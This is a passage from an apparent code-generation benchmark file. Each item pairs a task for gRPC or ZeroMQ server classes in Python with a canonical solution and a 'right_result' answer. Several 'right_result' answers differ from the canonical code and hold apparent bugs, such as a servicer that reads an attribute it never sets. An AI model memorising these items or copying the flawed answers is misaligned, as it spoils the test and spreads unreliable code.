    "right_result": "import os\nimport zmq\nimport json\nimport time\nfrom pathlib import Path\n\ndef run_generation_distributed(args, model, tokenizer):\n    context = zmq.Context()\n    socket = context.socket(zmq.REQ)\n    socket.connect(f\"tcp://{args.channel_ip}:{args.channel_port}\")\n    \n    output_dir = Path(args.output_path) / args.task_name\n    output_dir.mkdir(parents=True, exist_ok=True)\n    output_file = output_dir / f\"{args.rank}.jsonl\"\n    \n    while True:\n        try:\n            socket.send_json({\"type\": \"request_task\", \"rank\": args.rank})\n            message = socket.recv_json()\n            \n            if message[\"type\"] == \"task\":\n                task_id = message[\"task_id\"]\n                prompt = message[\"prompt\"]\n                \n                results = []\n                for sample_idx in range(args.samples_per_problem):\n                    try:\n                        processed = process_task(prompt, args.temperature, args.top_p, model, tokenizer)\n                        results.append({\n                            \"task_id\": task_id,\n                            \"sample_idx\": sample_idx,\n                            \"result\": processed,\n                            \"status\": \"success\"\n                        })\n                    except Exception as e:\n                        results.append({\n                            \"task_id\": task_id,\n                            \"sample_idx\": sample_idx,\n                            \"error\": str(e),\n                            \"status\": \"failure\"\n                        })\n                \n                with open(output_file, \"a\") as f:\n                    for result in results:\n                        f.write(json.dumps(result) + \"\\n\")\n                \n                socket.send_json({\n                    \"type\": \"task_complete\",\n                    \"rank\": args.rank,\n                    \"task_id\": task_id,\n                    \"success\": all(r[\"status\"] == \"success\" for r in results),\n                    \"output_path\": str(output_file)\n                })\n                socket.recv()  # Acknowledge\n                \n            elif message[\"type\"] == \"no_tasks\":\n                time.sleep(5)  # Wait before requesting again\n                continue\n                \n        except zmq.ZMQError:\n            time.sleep(5)\n            socket.disconnect(f\"tcp://{args.channel_ip}:{args.channel_port}\")\n            socket.connect(f\"tcp://{args.channel_ip}:{args.channel_port}\")\n\ndef process_task(prompt, temperature, top_p, model, tokenizer):\n    input_ids = tokenizer.encode(prompt, return_tensors=\"pt\").to(model.device)\n    output = model.generate(\n        input_ids,\n        max_new_tokens=2048,\n        temperature=temperature,\n        top_p=top_p,\n        do_sample=True,\n        pad_token_id=tokenizer.eos_token_id\n    )\n    return tokenizer.decode(output[0], skip_special_tokens=True)"
  },
  {
    "Task_id": 484,
    "Instruction": "Task Description: Implement a gRPC server in Python that handles network compute bridge requests using thread-safe queues for inter-process communication.\n\nClass Description: The implementation consists of two classes:\n1. NetworkComputeBridgeWorkerServicer - A gRPC servicer that processes incoming requests using thread-safe queues\n2. GRPCServer - Manages the gRPC server lifecycle and configuration\n\nAttributes:\n\nNetworkComputeBridgeWorkerServicer:\n- thread_input_queue: [Queue] - Queue for receiving incoming requests from other processes\n- thread_output_queue: [Queue] - Queue for sending responses back to other processes\n- _lock: [Lock] - Thread synchronization lock for queue operations\n\nGRPCServer:\n- port: [int] - Port number for the server to listen on\n- request_queue: [Queue] - Shared queue for incoming requests\n- response_queue: [Queue] - Shared queue for outgoing responses\n\nMethods:\n\nNetworkComputeBridgeWorkerServicer:\n- WorkerCompute(request, context) -> [network_compute_bridge_pb2.NetworkComputeResponse] - Processes compute requests by putting them in input queue and waiting for response from output queue\n- ListAvailableModels(request, context) -> [network_compute_bridge_pb2.ListAvailableModelsResponse] - Processes model listing requests by putting them in input queue and waiting for response from output queue\n\nGRPCServer:\n- start() -> [grpc.Server] - Initializes and starts the gRPC server with thread pool executor, binds it to the specified port, and registers the servicer",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nfrom multiprocessing import Lock, Queue\nimport bosdyn.api.network_compute_bridge_service_pb2_grpc as network_compute_bridge_service_pb2_grpc\nimport bosdyn.api.network_compute_bridge_pb2 as network_compute_bridge_pb2\n\nclass NetworkComputeBridgeWorkerServicer(network_compute_bridge_service_pb2_grpc.NetworkComputeBridgeWorkerServicer):\n    def __init__(self, thread_input_queue, thread_output_queue):\n        super(NetworkComputeBridgeWorkerServicer, self).__init__()\n        self.thread_input_queue = thread_input_queue\n        self.thread_output_queue = thread_output_queue\n        self._lock = Lock()\n\n    def WorkerCompute(self, request, context):\n        with self._lock:\n            self.thread_input_queue.put(request)\n            out_proto = self.thread_output_queue.get()\n        return out_proto\n\n    def ListAvailableModels(self, request, context):\n        with self._lock:\n            self.thread_input_queue.put(request)\n            out_proto = self.thread_output_queue.get()\n        return out_proto\n\nclass GRPCServer:\n    def __init__(self, port, request_queue, response_queue):\n        self.port = port\n        self.request_queue = request_queue\n        self.response_queue = response_queue\n\n    def start(self):\n        server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\n        network_compute_bridge_service_pb2_grpc.add_NetworkComputeBridgeWorkerServicer_to_server(\n            NetworkComputeBridgeWorkerServicer(self.request_queue, self.response_queue), server)\n        server.add_insecure_port(f'[::]:{self.port}')\n        server.start()\n        return server",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent import futures\nimport threading\nfrom queue import Queue, Empty\nfrom threading import Lock\nimport network_compute_bridge_pb2\nimport network_compute_bridge_pb2_grpc\n\nclass NetworkComputeBridgeWorkerServicer(network_compute_bridge_pb2_grpc.NetworkComputeBridgeWorkerServicer):\n    def __init__(self):\n        self.thread_input_queue = Queue()\n        self.thread_output_queue = Queue()\n        self._lock = Lock()\n\n    def WorkerCompute(self, request, context):\n        with self._lock:\n            self.thread_input_queue.put(request)\n            try:\n                return self.thread_output_queue.get(timeout=10)\n            except Empty:\n                context.set_details('Request timed out')\n                context.set_code(grpc.StatusCode.DEADLINE_EXCEEDED)\n                return network_compute_bridge_pb2.NetworkComputeResponse()\n\n    def ListAvailableModels(self, request, context):\n        with self._lock:\n            self.thread_input_queue.put(request)\n            try:\n                return self.thread_output_queue.get(timeout=10)\n            except Empty:\n                context.set_details('Request timed out')\n                context.set_code(grpc.StatusCode.DEADLINE_EXCEEDED)\n                return network_compute_bridge_pb2.ListAvailableModelsResponse()\n\nclass GRPCServer:\n    def __init__(self, port):\n        self.port = port\n        self.request_queue = Queue()\n        self.response_queue = Queue()\n\n    def start(self):\n        servicer = NetworkComputeBridgeWorkerServicer()\n        server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\n        network_compute_bridge_pb2_grpc.add_NetworkComputeBridgeWorkerServicer_to_server(servicer, server)\n        server.add_insecure_port(f'[::]:{self.port}')\n        server.start()\n        return server"
  },
  {
    "Task_id": 485,
    "Instruction": "Task Description: Implement a gRPC server in Python that provides speech recognition and language processing services using gRPC for inter-process communication.\n\nClass Description: The implementation consists of two main classes: ApiService (which handles the actual service logic) and GrpcServer (which manages the server lifecycle).\n\nAttributes:\n\nApiService:\n- speech_model: [Any] - The model used for speech recognition\n- language_model: [Any] - The model used for language processing\n\nGrpcServer:\n- host: [str] - The host address to bind the server to\n- port: [str] - The port number to bind the server to\n- max_workers: [int] - Maximum number of worker threads in the thread pool\n- server: [grpc.Server] - The gRPC server instance\n\nMethods:\n\nApiService:\n- Speech(request: [SpeechRequest], context: [grpc.ServicerContext]) -> [SpeechResponse] - Processes speech recognition requests\n- Language(request: [LanguageRequest], context: [grpc.ServicerContext]) -> [TextResponse] - Processes language translation requests\n- All(request: [SpeechRequest], context: [grpc.ServicerContext]) -> [TextResponse] - Processes combined speech recognition and language translation\n- Stream(request_iterator: [Iterator[SpeechRequest]], context: [grpc.ServicerContext]) -> [Iterator[TextResponse]] - Handles streaming speech recognition and processing\n\nGrpcServer:\n- start(service: [ApiService]) -> [None] - Starts the gRPC server with the specified service and runs it indefinitely\n  - Input: service - An instance of ApiService to handle incoming requests\n  - Output: None (runs indefinitely until interrupted)",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nfrom assets.asrt_pb2_grpc import AsrtGrpcServiceServicer, add_AsrtGrpcServiceServicer_to_server\nfrom assets.asrt_pb2 import SpeechResponse, TextResponse\nimport time\n\n_ONE_DAY_IN_SECONDS = 60 * 60 * 24\n\nclass ApiService(AsrtGrpcServiceServicer):\n    def __init__(self, speech_model, language_model):\n        self.speech_model = speech_model\n        self.language_model = language_model\n\n    def Speech(self, request, context):\n        wav_data = request.wav_data\n        wav_samples = decode_wav_bytes(samples_data=wav_data.samples,\n                                     channels=wav_data.channels, byte_width=wav_data.byte_width)\n        result = self.speech_model.recognize_speech(wav_samples, wav_data.sample_rate)\n        return SpeechResponse(status_code=200000, status_message='',\n                            result_data=result)\n\n    def Language(self, request, context):\n        result = self.language_model.pinyin_to_text(list(request.pinyins))\n        return TextResponse(status_code=200000, status_message='',\n                          text_result=result)\n\n    def All(self, request, context):\n        wav_data = request.wav_data\n        wav_samples = decode_wav_bytes(samples_data=wav_data.samples,\n                                     channels=wav_data.channels, byte_width=wav_data.byte_width)\n        result_speech = self.speech_model.recognize_speech(wav_samples, wav_data.sample_rate)\n        result = self.language_model.pinyin_to_text(result_speech)\n        return TextResponse(status_code=200000, status_message='',\n                          text_result=result)\n\n    def Stream(self, request_iterator, context):\n        result = list()\n        tmp_result_last = list()\n        beam_size = 100\n\n        for request in request_iterator:\n            wav_data = request.wav_data\n            wav_samples = decode_wav_bytes(samples_data=wav_data.samples,\n                                         channels=wav_data.channels,\n                                         byte_width=wav_data.byte_width)\n            result_speech = self.speech_model.recognize_speech(wav_samples, wav_data.sample_rate)\n\n            for item_pinyin in result_speech:\n                tmp_result = self.language_model.pinyin_stream_decode(tmp_result_last, item_pinyin, beam_size)\n                if len(tmp_result) == 0 and len(tmp_result_last) > 0:\n                    result.append(tmp_result_last[0][0])\n                    yield TextResponse(status_code=200000, status_message='',\n                                   text_result=''.join(result))\n                    result = list()\n                    tmp_result = self.language_model.pinyin_stream_decode([], item_pinyin, beam_size)\n                tmp_result_last = tmp_result\n                yield TextResponse(status_code=206000, status_message='',\n                               text_result=''.join(tmp_result[0][0]))\n\n        if len(tmp_result_last) > 0:\n            result.append(tmp_result_last[0][0])\n            yield TextResponse(status_code=200000, status_message='',\n                           text_result=''.join(result))\n\nclass GrpcServer:\n    def __init__(self, host, port, max_workers=10):\n        self.host = host\n        self.port = port\n        self.max_workers = max_workers\n        self.server = grpc.server(futures.ThreadPoolExecutor(max_workers=self.max_workers))\n\n    def start(self, service):\n        add_AsrtGrpcServiceServicer_to_server(service, self.server)\n        self.server.add_insecure_port(''.join([self.host, ':', self.port]))\n        self.server.start()\n        try:\n            while True:\n                time.sleep(_ONE_DAY_IN_SECONDS)\n        except KeyboardInterrupt:\n            self.server.stop(0)",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent import futures\nimport speech_pb2\nimport language_pb2\nimport service_pb2_grpc\n\nclass ApiService(service_pb2_grpc.ApiServiceServicer):\n    def __init__(self, speech_model, language_model):\n        self.speech_model = speech_model\n        self.language_model = language_model\n\n    def Speech(self, request, context):\n        recognized_text = self.speech_model.recognize(request.audio)\n        return speech_pb2.SpeechResponse(text=recognized_text)\n\n    def Language(self, request, context):\n        translated_text = self.language_model.translate(request.text, request.target_language)\n        return language_pb2.TextResponse(text=translated_text)\n\n    def All(self, request, context):\n        recognized_text = self.speech_model.recognize(request.audio)\n        translated_text = self.language_model.translate(recognized_text, request.target_language)\n        return language_pb2.TextResponse(text=translated_text)\n\n    def Stream(self, request_iterator, context):\n        for request in request_iterator:\n            recognized_text = self.speech_model.recognize(request.audio)\n            translated_text = self.language_model.translate(recognized_text, request.target_language)\n            yield language_pb2.TextResponse(text=translated_text)\n\nclass GrpcServer:\n    def __init__(self, host='localhost', port='50051', max_workers=10):\n        self.host = host\n        self.port = port\n        self.max_workers = max_workers\n        self.server = grpc.server(futures.ThreadPoolExecutor(max_workers=max_workers))\n\n    def start(self, service):\n        service_pb2_grpc.add_ApiServiceServicer_to_server(service, self.server)\n        self.server.add_insecure_port(f'{self.host}:{self.port}')\n        self.server.start()\n        try:\n            self.server.wait_for_termination()\n        except KeyboardInterrupt:\n            self.server.stop(0)"
  },
  {
    "Task_id": 486,
    "Instruction": "Task Description: Implement a gRPC server class that handles multiple protocols including health checks and service reflection, capable of serving JinaRPC and JinaSingleDataRequestRPC services.\n\nClass Description: MultiProtocolGateway is a class that sets up and manages a gRPC server with support for multiple services, health checks, and server reflection. It provides methods to start, run, and shutdown the server gracefully.\n\nAttributes:\n- grpc_port: int - The port number on which the gRPC server will listen\n- health_servicer: grpc_health.v1.health.HealthServicer - Handles health check requests for the services\n- grpc_server: grpc.aio.server - The asynchronous gRPC server instance\n\nMethods:\n- __init__(grpc_port: int) -> None - Initializes the MultiProtocolGateway with the specified gRPC port\n- _setup_grpc_server() -> None - Sets up the gRPC server with all required services (JinaRPC, JinaSingleDataRequestRPC), health checks, and reflection\n- run_server() -> None - Starts the gRPC server and keeps it running until termination\n- shutdown() -> None - Gracefully shuts down the gRPC server and health servicer",
    "Canonical_solution": "import grpc\nfrom grpc_health.v1 import health, health_pb2, health_pb2_grpc\nfrom grpc_reflection.v1alpha import reflection\nfrom jina.proto import jina_pb2, jina_pb2_grpc\nfrom jina.constants import __default_host__\n\nclass MultiProtocolGateway:\n    def __init__(self, grpc_port: int):\n        self.grpc_port = grpc_port\n        self.health_servicer = health.HealthServicer(experimental_non_blocking=True)\n\n    async def _setup_grpc_server(self):\n        self.grpc_server = grpc.aio.server()\n\n        jina_pb2_grpc.add_JinaRPCServicer_to_server(\n            self.streamer._streamer, self.grpc_server\n        )\n        jina_pb2_grpc.add_JinaSingleDataRequestRPCServicer_to_server(\n            self.streamer._streamer, self.grpc_server\n        )\n\n        service_names = (\n            jina_pb2.DESCRIPTOR.services_by_name['JinaRPC'].full_name,\n            jina_pb2.DESCRIPTOR.services_by_name['JinaSingleDataRequestRPC'].full_name,\n            reflection.SERVICE_NAME,\n        )\n        \n        health_pb2_grpc.add_HealthServicer_to_server(\n            self.health_servicer, self.grpc_server\n        )\n        for service in service_names:\n            self.health_servicer.set(service, health_pb2.HealthCheckResponse.SERVING)\n        reflection.enable_server_reflection(service_names, self.grpc_server)\n        self.grpc_server.add_insecure_port(f'{__default_host__}:{self.grpc_port}')\n        await self.grpc_server.start()\n\n    async def run_server(self):\n        await self.grpc_server.wait_for_termination()\n\n    async def shutdown(self):\n        await self.grpc_server.stop(0)\n        self.health_servicer.enter_graceful_shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom grpc_health.v1 import health, health_pb2_grpc\nfrom grpc_reflection.v1alpha import server_reflection\nimport asyncio\nfrom concurrent.futures import ThreadPoolExecutor\n\nclass MultiProtocolGateway:\n    def __init__(self, grpc_port: int) -> None:\n        self.grpc_port = grpc_port\n        self.health_servicer = health.HealthServicer()\n        self.grpc_server = None\n\n    def _setup_grpc_server(self) -> None:\n        from jina.serve.runtimes.gateway.grpc import JinaRPC, JinaSingleDataRequestRPC\n        self.grpc_server = grpc.server(ThreadPoolExecutor())\n        JinaRPC.add_to_server(self.grpc_server)\n        JinaSingleDataRequestRPC.add_to_server(self.grpc_server)\n        health_pb2_grpc.add_HealthServicer_to_server(self.health_servicer, self.grpc_server)\n        services = (\n            'jina.proto.JinaRPC',\n            'jina.proto.JinaSingleDataRequestRPC',\n            health_pb2_grpc.DESCRIPTOR.services_by_name['Health'].full_name,\n        )\n        server_reflection.enable_server_reflection(services, self.grpc_server)\n    \n    def run_server(self) -> None:\n        self._setup_grpc_server()\n        self.grpc_server.add_insecure_port(f'[::]:{self.grpc_port}')\n        self.grpc_server.start()\n        try:\n            asyncio.get_event_loop().run_forever()\n        except KeyboardInterrupt:\n            pass\n        finally:\n            self.shutdown()\n\n    def shutdown(self) -> None:\n        if self.grpc_server:\n            self.grpc_server.stop(0)\n        self.health_servicer.enter_idle()"
  },
  {
    "Task_id": 487,
    "Instruction": "Task Description: Create a gRPC server implementation in Python that handles E-Stop (Emergency Stop) functionality for robotic systems, including endpoint registration and check-in procedures with challenge-response verification.\n\nClass Description: The implementation consists of two classes:\n1. MockEstopServicer - Handles the actual gRPC service implementation for E-Stop functionality\n2. GRPCServer - Manages the gRPC server lifecycle and service registration\n\nAttributes:\n\nMockEstopServicer:\n- VALID_STOP_LEVEL: [int] - The valid stop level for E-Stop operations\n- NAME_FOR_ENDPOINT_UNKNOWN: [str] - Special endpoint name that triggers unknown endpoint status\n- NAME_FOR_SERVER_ERROR: [str] - Special endpoint name that triggers server error\n- STATUSES_THAT_DO_NOT_PROVIDE_CHALLENGE: [set] - Set of statuses that skip challenge generation\n- _rpc_delay: [int] - Artificial delay for RPC calls (for testing)\n- _challenge: [int] - Current challenge value for verification\n\nGRPCServer:\n- server: [grpc.Server] - The gRPC server instance\n\nMethods:\n\nMockEstopServicer:\n- __init__(rpc_delay: int = 0) -> None - Initializes the servicer with optional RPC delay\n- RegisterEstopEndpoint(request, context) -> None - Handles endpoint registration (stub implementation)\n- EstopCheckIn(request, context) -> bosdyn.api.estop_pb2.EstopCheckInResponse - Processes E-Stop check-in requests with challenge-response verification\n\nGRPCServer:\n- __init__() -> None - Initializes the gRPC server with thread pool executor\n- add_service(servicer: MockEstopServicer) -> None - Registers the E-Stop service with the server\n- start(port: int = 0) -> int - Starts the server on specified port (0 for auto-assigned) and returns bound port\n- stop() -> None - Stops the server gracefully",
    "Canonical_solution": "import grpc\nimport concurrent.futures\nimport bosdyn.api.estop_pb2\nimport bosdyn.api.estop_service_pb2_grpc\n\nclass MockEstopServicer(bosdyn.api.estop_service_pb2_grpc.EstopServiceServicer):\n    VALID_STOP_LEVEL = 1\n    NAME_FOR_ENDPOINT_UNKNOWN = 'mystery'\n    NAME_FOR_SERVER_ERROR = 'little-bobby-drop-tables'\n    STATUSES_THAT_DO_NOT_PROVIDE_CHALLENGE = \\\n        set([bosdyn.api.estop_pb2.EstopCheckInResponse.STATUS_UNKNOWN])\n\n    def __init__(self, rpc_delay=0):\n        super(MockEstopServicer, self).__init__()\n        self._rpc_delay = rpc_delay\n        self._challenge = 0\n\n    def RegisterEstopEndpoint(self, request, context):\n        pass\n\n    def EstopCheckIn(self, request, context):\n        resp = bosdyn.api.estop_pb2.EstopCheckInResponse()\n        resp.header.error.code = bosdyn.api.header_pb2.CommonError.CODE_OK\n        if request.endpoint.name == self.NAME_FOR_SERVER_ERROR:\n            resp.header.error.code = bosdyn.api.header_pb2.CommonError.CODE_INTERNAL_SERVER_ERROR\n        elif request.endpoint.name == self.NAME_FOR_ENDPOINT_UNKNOWN:\n            resp.status = resp.STATUS_ENDPOINT_UNKNOWN\n        else:\n            if not request.challenge:\n                resp.status = resp.STATUS_INCORRECT_CHALLENGE_RESPONSE\n            elif request.response != bosdyn.client.estop.response_from_challenge(request.challenge):\n                resp.status = resp.STATUS_INCORRECT_CHALLENGE_RESPONSE\n            else:\n                resp.status = resp.STATUS_OK\n        if resp.status not in self.STATUSES_THAT_DO_NOT_PROVIDE_CHALLENGE:\n            if request.challenge is not None:\n                self._challenge = request.challenge + 1\n            else:\n                self._challenge = 0\n            resp.challenge = self._challenge\n        return resp\n\nclass GRPCServer:\n    def __init__(self):\n        self.server = grpc.server(concurrent.futures.ThreadPoolExecutor(max_workers=10))\n\n    def add_service(self, servicer):\n        bosdyn.api.estop_service_pb2_grpc.add_EstopServiceServicer_to_server(servicer, self.server)\n\n    def start(self, port=0):\n        port = self.server.add_insecure_port(f'127.0.0.1:{port}')\n        self.server.start()\n        return port\n\n    def stop(self):\n        self.server.stop(0)",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import time\nimport threading\nimport grpc\nfrom concurrent import futures\nimport bosdyn.api.estop_pb2\nimport bosdyn.api.estop_pb2_grpc\n\nclass MockEstopServicer(bosdyn.api.estop_pb2_grpc.EstopServiceServicer):\n    VALID_STOP_LEVEL = 1\n    NAME_FOR_ENDPOINT_UNKNOWN = \"unknown-endpoint\"\n    NAME_FOR_SERVER_ERROR = \"server-error-endpoint\"\n    STATUSES_THAT_DO_NOT_PROVIDE_CHALLENGE = {bosdyn.api.estop_pb2.EstopCheckInResponse.STATUS_OK, \n                                            bosdyn.api.estop_pb2.EstopCheckInResponse.STATUS_ESTOPS_ARMED}\n    \n    def __init__(self, rpc_delay=0):\n        self._rpc_delay = rpc_delay\n        self._challenge = 0\n    \n    def RegisterEstopEndpoint(self, request, context):\n        pass\n    \n    def EstopCheckIn(self, request, context):\n        time.sleep(self._rpc_delay / 1000.0)\n        \n        if request.endpoint.name == self.NAME_FOR_ENDPOINT_UNKNOWN:\n            context.set_code(grpc.StatusCode.NOT_FOUND)\n            return bosdyn.api.estop_pb2.EstopCheckInResponse()\n            \n        if request.endpoint.name == self.NAME_FOR_SERVER_ERROR:\n            context.set_code(grpc.StatusCode.INTERNAL)\n            return bosdyn.api.estop_pb2.EstopCheckInResponse()\n        \n        response = bosdyn.api.estop_pb2.EstopCheckInResponse()\n        response.status = bosdyn.api.estop_pb2.EstopCheckInResponse.STATUS_OK\n        \n        if request.HasField('challenge_response'):\n            if request.challenge_response.response != ~self._challenge & 0xFFFFFFFF:\n                response.status = bosdyn.api.estop_pb2.EstopCheckInResponse.STATUS_INVALID_CHALLENGE_RESPONSE\n                return response\n                \n        if request.stop_level != self.VALID_STOP_LEVEL:\n            response.status = bosdyn.api.estop_pb2.EstopCheckInResponse.STATUS_INVALID_STOP_LEVEL\n            \n        if request.status_query_only:\n            return response\n            \n        if response.status in self.STATUSES_THAT_DO_NOT_PROVIDE_CHALLENGE:\n            response.challenge_request.nonce = 0\n            self._challenge = 0\n        else:\n            response.challenge_request.nonce = 1\n            self._challenge = 1\n            \n        return response\n\nclass GRPCServer:\n    def __init__(self):\n        self.server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\n    \n    def add_service(self, servicer):\n        bosdyn.api.estop_pb2_grpc.add_EstopServiceServicer_to_server(servicer, self.server)\n    \n    def start(self, port=0):\n        port = self.server.add_insecure_port(f'[::]:{port}')\n        self.server.start()\n        return port\n    \n    def stop(self):\n        self.server.stop(0)"
  },
  {
    "Task_id": 488,
    "Instruction": "Task Description: Implement a gRPC server class in Python that handles multiple types of RPC calls (Call, Train, Index, Search, StreamCall) and manages concurrent requests using a thread pool. The server should integrate with a ZeroMQ client for message passing and provide proper context management for resource cleanup.\n\nClass Description: FrontendService is a gRPC server implementation that processes incoming gRPC requests and forwards them to a backend service via ZeroMQ. It handles concurrent requests, manages server lifecycle, and provides streaming capabilities.\n\nAttributes:\n\n- server: [grpc.Server] - The gRPC server instance handling incoming requests\n- bind_address: [str] - The address and port where the server listens (format \"host:port\")\n- _stop_event: [threading.Event] - Event object used to signal server shutdown\n- args: [Namespace/object] - Configuration arguments for server setup (max_concurrency, max_message_size, etc.)\n\nMethods:\n\n- __init__(args) -> [None] - Initializes the gRPC server with thread pool executor and configures message size limits\n  Input: args - Configuration object containing server parameters\n- __enter__() -> [FrontendService] - Starts the gRPC server and clears stop event (context manager entry)\n- __exit__(exc_type, exc_val, exc_tb) -> [None] - Stops the gRPC server and triggers cleanup (context manager exit)\n  Input: exc_type, exc_val, exc_tb - Exception information if any occurred\n- stop() -> [None] - Signals the server to stop by setting the stop event\n- join() -> [None] - Waits for the server to complete shutdown\n- _Servicer: [Nested class] - Handles actual gRPC method implementations\n  Methods:\n    - Call(request, context) -> [gnes_pb2.Response] - Processes standard RPC calls\n      Input: request - gRPC request message, context - gRPC context object\n      Output: Processed response message\n    - Train(request, context) -> [gnes_pb2.Response] - Handles training requests\n    - Index(request, context) -> [gnes_pb2.Response] - Handles indexing requests\n    - Search(request, context) -> [gnes_pb2.Response] - Handles search requests\n    - StreamCall(request_iterator, context) -> [Iterator[gnes_pb2.Response]] - Handles streaming RPC calls\n      Input: request_iterator - Iterator of incoming streaming requests\n      Output: Iterator of response messages\n    - ZmqContext: [Nested class] - Manages ZeroMQ client lifecycle\n      Methods:\n        - __init__(args) -> [None] - Initializes thread-local storage for ZMQ client\n        - __enter__() -> [ZmqClient] - Creates and returns a ZMQ client instance\n        - __exit__(exc_type, exc_value, exc_traceback) -> [None] - Cleans up ZMQ client resources",
    "Canonical_solution": "import grpc\nfrom concurrent.futures import ThreadPoolExecutor\nfrom ..proto import gnes_pb2_grpc, gnes_pb2\nfrom ..client.base import ZmqClient\nimport threading\n\nclass FrontendService:\n    def __init__(self, args):\n        self.server = grpc.server(\n            ThreadPoolExecutor(max_workers=args.max_concurrency),\n            options=[('grpc.max_send_message_length', args.max_message_size),\n                     ('grpc.max_receive_message_length', args.max_message_size)])\n        gnes_pb2_grpc.add_GnesRPCServicer_to_server(self._Servicer(args), self.server)\n        self.bind_address = '{0}:{1}'.format(args.grpc_host, args.grpc_port)\n        self.server.add_insecure_port(self.bind_address)\n        self._stop_event = threading.Event()\n\n    def __enter__(self):\n        self.server.start()\n        self._stop_event.clear()\n        return self\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        self.server.stop(None)\n        self.stop()\n\n    def stop(self):\n        self._stop_event.set()\n\n    def join(self):\n        self._stop_event.wait()\n\n    class _Servicer(gnes_pb2_grpc.GnesRPCServicer):\n        def __init__(self, args):\n            self.args = args\n            self.zmq_context = self.ZmqContext(args)\n            self.request_id_cnt = 0\n            self.send_recv_kwargs = dict(\n                check_version=self.args.check_version,\n                timeout=self.args.timeout,\n                squeeze_pb=self.args.squeeze_pb)\n            self.pending_request = 0\n\n        def Call(self, request, context):\n            with self.zmq_context as zmq_client:\n                zmq_client.send_message(self.add_envelope(request, zmq_client), **self.send_recv_kwargs)\n                return self.remove_envelope(zmq_client.recv_message(**self.send_recv_kwargs))\n\n        def Train(self, request, context):\n            return self.Call(request, context)\n\n        def Index(self, request, context):\n            return self.Call(request, context)\n\n        def Search(self, request, context):\n            return self.Call(request, context)\n\n        def StreamCall(self, request_iterator, context):\n            self.pending_request = 0\n\n            def get_response(num_recv, blocked=False):\n                for _ in range(num_recv):\n                    if blocked or zmq_client.receiver.poll(1):\n                        msg = zmq_client.recv_message(**self.send_recv_kwargs)\n                        self.pending_request -= 1\n                        yield self.remove_envelope(msg)\n\n                while zmq_client.receiver.poll(1):\n                    msg = zmq_client.recv_message(**self.send_recv_kwargs)\n                    self.pending_request -= 1\n                    yield self.remove_envelope(msg)\n\n            with self.zmq_context as zmq_client:\n                for request in request_iterator:\n                    num_recv = max(self.pending_request - self.args.max_pending_request, 1)\n                    yield from get_response(num_recv, num_recv > 1)\n                    zmq_client.send_message(self.add_envelope(request, zmq_client), **self.send_recv_kwargs)\n                    self.pending_request += 1\n\n                yield from get_response(self.pending_request, blocked=True)\n\n        class ZmqContext:\n            def __init__(self, args):\n                self.args = args\n                self.tlocal = threading.local()\n                self.tlocal.client = None\n\n            def __enter__(self):\n                client = ZmqClient(self.args)\n                self.tlocal.client = client\n                return client\n\n            def __exit__(self, exc_type, exc_value, exc_traceback):\n                self.tlocal.client.close()\n                self.tlocal.client = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent.futures import ThreadPoolExecutor\nimport zmq\nimport threading\nfrom typing import Optional, Any, Iterator\nimport gnes_pb2\n\nclass FrontendService:\n    def __init__(self, args: Any):\n        self.args = args\n        self.server = grpc.server(\n            ThreadPoolExecutor(max_workers=args.max_concurrency),\n            options=[('grpc.max_send_message_length', args.max_message_size),\n                     ('grpc.max_receive_message_length', args.max_message_size)]\n        )\n        self.bind_address = f\"{args.host}:{args.port}\"\n        self._stop_event = threading.Event()\n\n    def __enter__(self) -> 'FrontendService':\n        self._stop_event.clear()\n        self.server.add_insecure_port(self.bind_address)\n        self.server.start()\n        return self\n\n    def __exit__(self, exc_type: Optional[Any], exc_val: Optional[Any], exc_tb: Optional[Any]) -> None:\n        self.stop()\n        self.join()\n\n    def stop(self) -> None:\n        self._stop_event.set()\n        self.server.stop(None)\n\n    def join(self) -> None:\n        self._stop_event.wait()\n\n    class _Servicer:\n        def __init__(self, zmq_context_class: Any):\n            self.zmq_context = zmq_context_class\n\n        def Call(self, request: Any, context: Any) -> gnes_pb2.Response:\n            with self.zmq_context(self.args) as client:\n                return client.send_request(request)\n\n        def Train(self, request: Any, context: Any) -> gnes_pb2.Response:\n            with self.zmq_context(self.args) as client:\n                return client.send_train(request)\n\n        def Index(self, request: Any, context: Any) -> gnes_pb2.Response:\n            with self.zmq_context(self.args) as client:\n                return client.send_index(request)\n\n        def Search(self, request: Any, context: Any) -> gnes_pb2.Response:\n            with self.zmq_context(self.args) as client:\n                return client.send_search(request)\n\n        def StreamCall(self, request_iterator: Iterator[Any], context: Any) -> Iterator[gnes_pb2.Response]:\n            with self.zmq_context(self.args) as client:\n                for req in request_iterator:\n                    yield client.send_stream(req)\n\n    class ZmqContext:\n        def __init__(self, args: Any):\n            self.args = args\n            self.local = threading.local()\n\n        def __enter__(self) -> Any:\n            if not hasattr(self.local, 'zmq_client'):\n                self.local.zmq_client = ZmqClient(self.args)\n            return self.local.zmq_client\n\n        def __exit__(self, exc_type: Optional[Any], exc_value: Optional[Any], exc_traceback: Optional[Any]) -> None:\n            if hasattr(self.local, 'zmq_client'):\n                self.local.zmq_client.close()\n                del self.local.zmq_client\n\nclass ZmqClient:\n    def __init__(self, args: Any):\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.REQ)\n        self.socket.connect(f\"tcp://{args.backend_host}:{args.backend_port}\")\n\n    def close(self) -> None:\n        self.socket.close()\n        self.context.term()\n\n    def send_request(self, request: Any) -> gnes_pb2.Response:\n        self.socket.send(request.SerializeToString())\n        response = gnes_pb2.Response()\n        response.ParseFromString(self.socket.recv())\n        return response\n\n    def send_train(self, request: Any) -> gnes_pb2.Response:\n        return self.send_request(request)\n\n    def send_index(self, request: Any) -> gnes_pb2.Response:\n        return self.send_request(request)\n\n    def send_search(self, request: Any) -> gnes_pb2.Response:\n        return self.send_request(request)\n\n    def send_stream(self, request: Any) -> gnes_pb2.Response:\n        return self.send_request(request)"
  },
  {
    "Task_id": 489,
